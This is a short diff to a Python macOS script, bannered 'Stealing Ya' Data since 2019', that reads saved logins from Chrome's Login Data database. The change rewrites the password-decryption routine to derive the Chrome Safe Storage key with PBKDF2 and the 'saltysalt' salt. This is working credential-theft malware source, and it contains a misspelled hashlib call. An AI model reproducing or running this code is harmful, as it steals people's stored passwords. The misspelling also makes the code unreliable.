@@ -4,6 +4,7 @@ from os.path import expanduser
 import sqlite3
 import binascii
 import subprocess
+import hashlib
 
 print("""
 Stealing Ya' Data since 2019
@@ -55,8 +56,8 @@ conn = sqlite3.connect(expanduser("~/Library/Application Support/Google/Chrome/D
 cursor = conn.cursor()
 cursor.execute('SELECT action_url, username_value, password_value FROM logins')
 
-def decryting(encrypted, iv, key=none):
-    hexKey = binascii.hexlify(key)
+def decryting(encrypted, iv):
+    hexKey = binascii.hexlify(hashlib.pkdf2_hmac('sha1',safeStorageKey, b"saltysalt", 1003)[:16])
 
 
 for result in cursor.fetchall():
